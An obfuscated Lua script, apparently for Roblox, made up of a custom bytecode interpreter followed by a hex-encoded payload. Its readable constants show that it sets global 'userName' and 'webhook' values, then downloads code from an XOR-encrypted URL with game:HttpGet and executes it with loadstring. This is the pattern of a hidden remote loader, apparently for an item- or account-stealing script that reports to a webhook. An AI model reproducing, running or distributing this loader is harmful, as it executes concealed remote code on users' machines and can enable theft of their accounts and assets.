local StrToNumber = tonumber;
local Byte = string.byte;
local Char = string.char;
local Sub = string.sub;
local Subg = string.gsub;
local Rep = string.rep;
local Concat = table.concat;
local Insert = table.insert;
local LDExp = math.ldexp;
local GetFEnv = getfenv or function()
	return _ENV;
end;
local Setmetatable = setmetatable;
local PCall = pcall;
local Select = select;
local Unpack = unpack or table.unpack;
local ToNumber = tonumber;
local function VMCall(ByteString, vmenv, ...)
	local DIP = 1;
	local repeatNext;
	ByteString = Subg(Sub(ByteString, 5), "..", function(byte)
		if (Byte(byte, 2) == 79) then
			repeatNext = StrToNumber(Sub(byte, 1, 1));
			return "";
		else
			local a = Char(StrToNumber(byte, 16));
			if repeatNext then
				local b = Rep(a, repeatNext);
				repeatNext = nil;
				return b;
			else
				return a;
			end
		end
	end);
	local function gBit(Bit, Start, End)
		if End then
			local Res = (Bit / (2 ^ (Start - 1))) % (2 ^ (((End - 1) - (Start - 1)) + 1));
			return Res - (Res % 1);
		else
			local Plc = 2 ^ (Start - 1);
			return (((Bit % (Plc + Plc)) >= Plc) and 1) or 0;
		end
	end
	local function gBits8()
		local a = Byte(ByteString, DIP, DIP);
		DIP = DIP + 1;
		return a;
	end
	local function gBits16()
		local a, b = Byte(ByteString, DIP, DIP + 2);
		DIP = DIP + 2;
		return (b * 256) + a;
	end
	local function gBits32()
		local a, b, c, d = Byte(ByteString, DIP, DIP + 3);
		DIP = DIP + 4;
		return (d * 16777216) + (c * 65536) + (b * 256) + a;
	end
	local function gFloat()
		local Left = gBits32();
		local Right = gBits32();
		local IsNormal = 1;
		local Mantissa = (gBit(Right, 1, 20) * (2 ^ 32)) + Left;
		local Exponent = gBit(Right, 21, 31);
		local Sign = ((gBit(Right, 32) == 1) and -1) or 1;
		if (Exponent == 0) then
			if (Mantissa == 0) then
				return Sign * 0;
			else
				Exponent = 1;
				IsNormal = 0;
			end
		elseif (Exponent == 2047) then
			return ((Mantissa == 0) and (Sign * (1 / 0))) or (Sign * NaN);
		end
		return LDExp(Sign, Exponent - 1023) * (IsNormal + (Mantissa / (2 ^ 52)));
	end
	local function gString(Len)
		local Str;
		if not Len then
			Len = gBits32();
			if (Len == 0) then
				return "";
			end
		end
		Str = Sub(ByteString, DIP, (DIP + Len) - 1);
		DIP = DIP + Len;
		local FStr = {};
		for Idx = 1, #Str do
			FStr[Idx] = Char(Byte(Sub(Str, Idx, Idx)));
		end
		return Concat(FStr);
	end
	local gInt = gBits32;
	local function _R(...)
		return {...}, Select("#", ...);
	end
	local function Deserialize()
		local Instrs = {};
		local Functions = {};
		local Lines = {};
		local Chunk = {Instrs,Functions,nil,Lines};
		local ConstCount = gBits32();
		local Consts = {};
		for Idx = 1, ConstCount do
			local Type = gBits8();
			local Cons;
			if (Type == 1) then
				Cons = gBits8() ~= 0;
			elseif (Type == 2) then
				Cons = gFloat();
			elseif (Type == 3) then
				Cons = gString();
			end
			Consts[Idx] = Cons;
		end
		Chunk[3] = gBits8();
		for Idx = 1, gBits32() do
			local Descriptor = gBits8();
			if (gBit(Descriptor, 1, 1) == 0) then
				local Type = gBit(Descriptor, 2, 3);
				local Mask = gBit(Descriptor, 4, 6);
				local Inst = {gBits16(),gBits16(),nil,nil};
				if (Type == 0) then
					Inst[3] = gBits16();
					Inst[4] = gBits16();
				elseif (Type == 1) then
					Inst[3] = gBits32();
				elseif (Type == 2) then
					Inst[3] = gBits32() - (2 ^ 16);
				elseif (Type == 3) then
					Inst[3] = gBits32() - (2 ^ 16);
					Inst[4] = gBits16();
				end
				if (gBit(Mask, 1, 1) == 1) then
					Inst[2] = Consts[Inst[2]];
				end
				if (gBit(Mask, 2, 2) == 1) then
					Inst[3] = Consts[Inst[3]];
				end
				if (gBit(Mask, 3, 3) == 1) then
					Inst[4] = Consts[Inst[4]];
				end
				Instrs[Idx] = Inst;
			end
		end
		for Idx = 1, gBits32() do
			Functions[Idx - 1] = Deserialize();
		end
		return Chunk;
	end
	local function Wrap(Chunk, Upvalues, Env)
		local Instr = Chunk[1];
		local Proto = Chunk[2];
		local Params = Chunk[3];
		return function(...)
			local Instr = Instr;
			local Proto = Proto;
			local Params = Params;
			local _R = _R;
			local VIP = 1;
			local Top = -1;
			local Vararg = {};
			local Args = {...};
			local PCount = Select("#", ...) - 1;
			local Lupvals = {};
			local Stk = {};
			for Idx = 0, PCount do
				if (Idx >= Params) then
					Vararg[Idx - Params] = Args[Idx + 1];
				else
					Stk[Idx] = Args[Idx + 1];
				end
			end
			local Varargsz = (PCount - Params) + 1;
			local Inst;
			local Enum;
			while true do
				Inst = Instr[VIP];
				Enum = Inst[1];
				if (Enum <= 26) then
					if (Enum <= 12) then
						if (Enum <= 5) then
							if (Enum <= 2) then
								if (Enum <= 0) then
									Stk[Inst[2]]();
								elseif (Enum > 1) then
									Stk[Inst[2]] = Stk[Inst[3]];
								else
									Env[Inst[3]] = Stk[Inst[2]];
								end
							elseif (Enum <= 3) then
								Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
							elseif (Enum > 4) then
								Stk[Inst[2]] = Stk[Inst[3]] % Inst[4];
							else
								local A = Inst[2];
								local B = Stk[Inst[3]];
								Stk[A + 1] = B;
								Stk[A] = B[Inst[4]];
							end
						elseif (Enum <= 8) then
							if (Enum <= 6) then
								Stk[Inst[2]] = Inst[3] + Stk[Inst[4]];
							elseif (Enum > 7) then
								Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
							else
								VIP = Inst[3];
							end
						elseif (Enum <= 10) then
							if (Enum > 9) then
								local A = Inst[2];
								local Results, Limit = _R(Stk[A](Stk[A + 1]));
								Top = (Limit + A) - 1;
								local Edx = 0;
								for Idx = A, Top do
									Edx = Edx + 1;
									Stk[Idx] = Results[Edx];
								end
							else
								local A = Inst[2];
								local Results, Limit = _R(Stk[A](Stk[A + 1]));
								Top = (Limit + A) - 1;
								local Edx = 0;
								for Idx = A, Top do
									Edx = Edx + 1;
									Stk[Idx] = Results[Edx];
								end
							end
						elseif (Enum == 11) then
							local A = Inst[2];
							local Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
							Top = (Limit + A) - 1;
							local Edx = 0;
							for Idx = A, Top do
								Edx = Edx + 1;
								Stk[Idx] = Results[Edx];
							end
						else
							local A = Inst[2];
							Stk[A](Unpack(Stk, A + 1, Top));
						end
					elseif (Enum <= 19) then
						if (Enum <= 15) then
							if (Enum <= 13) then
								do
									return;
								end
							elseif (Enum == 14) then
								Stk[Inst[2]] = Inst[3] + Stk[Inst[4]];
							else
								do
									return;
								end
							end
						elseif (Enum <= 17) then
							if (Enum == 16) then
								Env[Inst[3]] = Stk[Inst[2]];
							else
								local A = Inst[2];
								local B = Stk[Inst[3]];
								Stk[A + 1] = B;
								Stk[A] = B[Inst[4]];
							end
						elseif (Enum > 18) then
							local A = Inst[2];
							local Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Top)));
							Top = (Limit + A) - 1;
							local Edx = 0;
							for Idx = A, Top do
								Edx = Edx + 1;
								Stk[Idx] = Results[Edx];
							end
						else
							Stk[Inst[2]]();
						end
					elseif (Enum <= 22) then
						if (Enum <= 20) then
							Stk[Inst[2]] = Stk[Inst[3]];
						elseif (Enum == 21) then
							Stk[Inst[2]] = {};
						else
							Stk[Inst[2]] = Stk[Inst[3]] + Inst[4];
						end
					elseif (Enum <= 24) then
						if (Enum > 23) then
							local A = Inst[2];
							Stk[A](Unpack(Stk, A + 1, Top));
						else
							local NewProto = Proto[Inst[3]];
							local NewUvals;
							local Indexes = {};
							NewUvals = Setmetatable({}, {__index=function(_, Key)
								local Val = Indexes[Key];
								return Val[1][Val[2]];
							end,__newindex=function(_, Key, Value)
								local Val = Indexes[Key];
								Val[1][Val[2]] = Value;
							end});
							for Idx = 1, Inst[4] do
								VIP = VIP + 1;
								local Mvm = Instr[VIP];
								if (Mvm[1] == 20) then
									Indexes[Idx - 1] = {Stk,Mvm[3]};
								else
									Indexes[Idx - 1] = {Upvalues,Mvm[3]};
								end
								Lupvals[#Lupvals + 1] = Indexes;
							end
							Stk[Inst[2]] = Wrap(NewProto, NewUvals, Env);
						end
					elseif (Enum == 25) then
						Stk[Inst[2]] = Stk[Inst[3]] % Stk[Inst[4]];
					else
						Stk[Inst[2]] = Stk[Inst[3]] + Inst[4];
					end
				elseif (Enum <= 39) then
					if (Enum <= 32) then
						if (Enum <= 29) then
							if (Enum <= 27) then
								if not Stk[Inst[2]] then
									VIP = VIP + 1;
								else
									VIP = Inst[3];
								end
							elseif (Enum > 28) then
								local A = Inst[2];
								Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
							else
								local NewProto = Proto[Inst[3]];
								local NewUvals;
								local Indexes = {};
								NewUvals = Setmetatable({}, {__index=function(_, Key)
									local Val = Indexes[Key];
									return Val[1][Val[2]];
								end,__newindex=function(_, Key, Value)
									local Val = Indexes[Key];
									Val[1][Val[2]] = Value;
								end});
								for Idx = 1, Inst[4] do
									VIP = VIP + 1;
									local Mvm = Instr[VIP];
									if (Mvm[1] == 20) then
										Indexes[Idx - 1] = {Stk,Mvm[3]};
									else
										Indexes[Idx - 1] = {Upvalues,Mvm[3]};
									end
									Lupvals[#Lupvals + 1] = Indexes;
								end
								Stk[Inst[2]] = Wrap(NewProto, NewUvals, Env);
							end
						elseif (Enum <= 30) then
							local A = Inst[2];
							local Index = Stk[A];
							local Step = Stk[A + 2];
							if (Step > 0) then
								if (Index > Stk[A + 1]) then
									VIP = Inst[3];
								else
									Stk[A + 3] = Index;
								end
							elseif (Index < Stk[A + 1]) then
								VIP = Inst[3];
							else
								Stk[A + 3] = Index;
							end
						elseif (Enum == 31) then
							Stk[Inst[2]] = Inst[3];
						else
							Stk[Inst[2]] = Stk[Inst[3]] % Inst[4];
						end
					elseif (Enum <= 35) then
						if (Enum <= 33) then
							local A = Inst[2];
							local Step = Stk[A + 2];
							local Index = Stk[A] + Step;
							Stk[A] = Index;
							if (Step > 0) then
								if (Index <= Stk[A + 1]) then
									VIP = Inst[3];
									Stk[A + 3] = Index;
								end
							elseif (Index >= Stk[A + 1]) then
								VIP = Inst[3];
								Stk[A + 3] = Index;
							end
						elseif (Enum == 34) then
							local A = Inst[2];
							local Index = Stk[A];
							local Step = Stk[A + 2];
							if (Step > 0) then
								if (Index > Stk[A + 1]) then
									VIP = Inst[3];
								else
									Stk[A + 3] = Index;
								end
							elseif (Index < Stk[A + 1]) then
								VIP = Inst[3];
							else
								Stk[A + 3] = Index;
							end
						else
							local A = Inst[2];
							do
								return Unpack(Stk, A, Top);
							end
						end
					elseif (Enum <= 37) then
						if (Enum > 36) then
							local A = Inst[2];
							do
								return Unpack(Stk, A, Top);
							end
						else
							Stk[Inst[2]] = #Stk[Inst[3]];
						end
					elseif (Enum == 38) then
						local A = Inst[2];
						do
							return Stk[A](Unpack(Stk, A + 1, Inst[3]));
						end
					else
						Stk[Inst[2]] = #Stk[Inst[3]];
					end
				elseif (Enum <= 46) then
					if (Enum <= 42) then
						if (Enum <= 40) then
							Stk[Inst[2]] = Stk[Inst[3]] % Stk[Inst[4]];
						elseif (Enum == 41) then
							local A = Inst[2];
							local Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
							Top = (Limit + A) - 1;
							local Edx = 0;
							for Idx = A, Top do
								Edx = Edx + 1;
								Stk[Idx] = Results[Edx];
							end
						else
							Stk[Inst[2]] = Upvalues[Inst[3]];
						end
					elseif (Enum <= 44) then
						if (Enum > 43) then
							if not Stk[Inst[2]] then
								VIP = VIP + 1;
							else
								VIP = Inst[3];
							end
						else
							Stk[Inst[2]] = {};
						end
					elseif (Enum > 45) then
						Stk[Inst[2]] = Upvalues[Inst[3]];
					else
						VIP = Inst[3];
					end
				elseif (Enum <= 49) then
					if (Enum <= 47) then
						local A = Inst[2];
						Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
					elseif (Enum > 48) then
						Stk[Inst[2]] = Env[Inst[3]];
					else
						Stk[Inst[2]] = Env[Inst[3]];
					end
				elseif (Enum <= 51) then
					if (Enum > 50) then
						local A = Inst[2];
						local Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Top)));
						Top = (Limit + A) - 1;
						local Edx = 0;
						for Idx = A, Top do
							Edx = Edx + 1;
							Stk[Idx] = Results[Edx];
						end
					else
						local A = Inst[2];
						do
							return Stk[A](Unpack(Stk, A + 1, Inst[3]));
						end
					end
				elseif (Enum > 52) then
					Stk[Inst[2]] = Inst[3];
				else
					local A = Inst[2];
					local Step = Stk[A + 2];
					local Index = Stk[A] + Step;
					Stk[A] = Index;
					if (Step > 0) then
						if (Index <= Stk[A + 1]) then
							VIP = Inst[3];
							Stk[A + 3] = Index;
						end
					elseif (Index >= Stk[A + 1]) then
						VIP = Inst[3];
						Stk[A + 3] = Index;
					end
				end
				VIP = VIP + 1;
			end
		end;
	end
	return Wrap(Deserialize(), {}, vmenv)(...);
end
return VMCall("LOL!133O0003063O00737472696E6703043O006368617203043O00627974652O033O0073756203053O0062697433322O033O0062697403043O0062786F7203053O007461626C6503063O00636F6E63617403063O00696E7365727403083O00757365724E616D6503743O003C4E5E574A26494168263B297C3F71747A5C3C696C5E697B6D775B4C5C3E5074226C386E2O223758355C224E3625223436733C75227639262248377C2277366E353622543638355A2256367A3824225D3B63224A374A3569227A374B224B3628372F224036763748222737433A52224436643D7603073O00776562682O6F6B03A4042O0042414272516475467674467357725C3857234D785B736E3439385D244D71574E3C5F565F6C505D443E7C562F3D536C4959403C455F415D733972475E683878606E585A454E3E48727C303B66464C75793E435341353D5021373B374A5567505F59715B3D475954765B695945394F7671575852715B604736675C4A635B4E5F776732354036535231722259675134706E725A765F4D7D57663B4576405E30775B5F245A36503A66686C6967613D4E5A706E673C6C7D5456675F6C373D715D5974375E5F765E375573354D796B4A5547533E4A6A304D555732385948705D6C4838793D55506F455F6D38265278465E57726D3E504F3D6A754B2O663E755C39203567354A4038607A292068713258486D7A7E783A7156306D58786B562F6F42484C782749233D4A6E63756F5D4554736D446665374B795D474B385658465C24704036735D535F622O7E223E36773B4222293D382263367E366B222836743836222O3A53226A3A492237364E36482244364722673751356E2279367B376F22583767395322483A5A222437333747227337523923227A372O22553A30225C3757382422363D7A223E3C7E22413B41223137433A3E22253637366B22253D62224A39352249362C38462223362O3B42227936503E46223E372522513657225636563D772221383F222736383B752238373936482221364D3A6C2270365B226B386E223A36453569227936722O3622303746372A227A366B38682224373F396F226B362O382622773E7022673632363C223A36353D50227837363861223937353634224D363436712267363E374D2240376B35342244375F3950224F37713644222O36213C5922413742357522603950224C36453849226B36493B2922683629382D224237782230366A3671227337213774225237253674226136213932226E3D6622423A41223C365335412263365B3E6C2242373D3755222B3C5B2235367C3938222O36463D4F22233670354D2278363539602O223E72222O365E376F2260372B3837224F36293954227B36523847223B39622229362138472263362B3A7A2225365836392254384222762O37384522373C7522443A7E22633B462274376E3821226F36503658223C3E5822443632365F226D2O3822703660224E3643384C22493675383722753C5F222C373C3641227A3A7B2265377436272278385522293675355A22533E402227366536342251366F386F22513C2F224537782223397B224C397D225A362E35502253376A222D2O373552225D36573A732223375A3662223C364736482262362B35682231367C375622233641223C395822513C24224D3A77224B3669374D224637783979222A3A73223B36613A6E22253A77225E366B352A224736473B5B223837523A3E2264366E3E7E225C3E7D223B375B366E2226364C3C362244396F22483663226C3670374F225A3A622227363B3C7622343B7E227337453951224A3B682257375B382D225B387022543761383B223F36763C6522313D6D22383768353F222837533A2722423C7E22403B6122753666352C226136463C2F22273C7A222436523B4C223A365B384722563778363B2269367D3B53222C3C6122263B74225D366C3A7A224C3D3C2263365C365722563B6B2232365E3D44227537643973030A3O006C6F6164737472696E6703043O0067616D6503073O00482O7470476574034A3O00D9D7CF35F5E18851C3C2CC6BE1B2D316C4C1CE36E3A9C411DFD7DE2BF2F5C411DC8CE826F4B2D70AC28EEF20F4B6C21A9EF0D837EFABD30DEEE1DE31E7F4CA1FD8CD9428EBE98912C4C203083O007EB1A3BB4586DBA700264O00157O001230000100013O002003000100010002001230000200013O002003000200020003001230000300013O002003000300030004001230000400053O00061B0004000B0001000100042D3O000B0001001230000400063O002003000500040007001230000600083O002003000600060009001230000700083O00200300070007000A00061700083O000100062O00143O00074O00143O00014O00143O00054O00143O00024O00143O00034O00143O00063O00121F0009000C3O0012010009000B3O00121F0009000E3O0012010009000D3O0012300009000F3O001230000A00103O002004000A000A00112O0002000C00083O00121F000D00123O00121F000E00134O000B000C000E4O0033000A6O001D00093O00022O00120009000100012O000F3O00013O00013O00023O00026O00F03F026O00704002264O001500025O00121F000300014O002700045O00121F000500013O00041E0003002100012O002E00076O0002000800024O002E000900014O002E000A00024O002E000B00034O002E000C00044O0002000D6O0002000E00063O00201A000F000600012O000B000C000F4O001D000B3O00022O002E000C00034O002E000D00044O0002000E00014O0027000F00014O0019000F0006000F001006000F0001000F2O0027001000014O001900100006001000100600100001001000201A0010001000012O000B000D00104O0033000C6O001D000A3O0002002O20000A000A00022O000A0009000A4O001800073O00010004340003000500012O002E000300054O0002000400024O0032000300044O002500036O000F3O00017O00", GetFEnv(), ...);
